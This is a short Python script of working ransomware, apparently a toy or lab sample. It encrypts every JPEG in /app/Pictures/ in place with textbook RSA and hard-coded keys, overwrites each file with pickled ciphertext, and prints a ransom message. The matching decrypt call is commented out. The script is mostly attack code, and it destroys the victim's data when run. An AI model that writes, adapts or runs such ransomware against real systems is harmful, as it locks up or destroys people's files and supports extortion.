import pickle, os
import imghdr
import threading

n = 22291846172619859445381409012451
e = 65535
d = 14499309299673345844676003563183

def rsa_encrypt(filename):
    plain_bytes = b''
    with open(filename, 'rb') as f:
        plain_bytes = f.read()
    cipher_int = [pow(i, e, n) for i in plain_bytes]
    with open(filename, 'wb') as f:
        pickle.dump(cipher_int, f)


def rsa_decrypt(filename):
    with open(filename, 'rb') as f:
        cipher_int = pickle.load(f)
        decrypted_int = [pow(i, d, n) for i in cipher_int]
        decrypted_bytes = bytes(decrypted_int)
    with open(filename, 'wb') as f:
        f.write(decrypted_bytes)


def is_valid_image(filename, type=None):
    if type=='jpg':
        with open(filename, 'rb') as f:
            header = f.read(32)  # Read the first 32 bytes
            return imghdr.what(None, header) == 'jpeg'
    else:
        with open(filename, 'rb') as f:
            header = f.read(32)  # Read the first 32 bytes
            return imghdr.what(None, header) is not None


if __name__ == "__main__":
    target = "/app/Pictures/"
    pics = [os.path.join(target, f) for f in os.listdir(target)]
    text = """///////////////////////////////////////////////////////////////////////////
////////////////////////////---------ERROR----------///////////////////////
////////////////////------ Give me ransom hahaha -------///////////////////
///////////////////////////////////////////////////////////////////////////
"""
    threads = []
    for pic in pics:
        if is_valid_image(pic, 'jpg'):
            threads.append(threading.Thread(target=rsa_encrypt, args=[pic]))
            threads[-1].start()
        # elif not is_valid_image(pic):
        #     threads.append(threading.Thread(target=rsa_decrypt, args=[pic]))
        #     threads[-1].start()
    for thread in threads:
        thread.join()
    print(text)
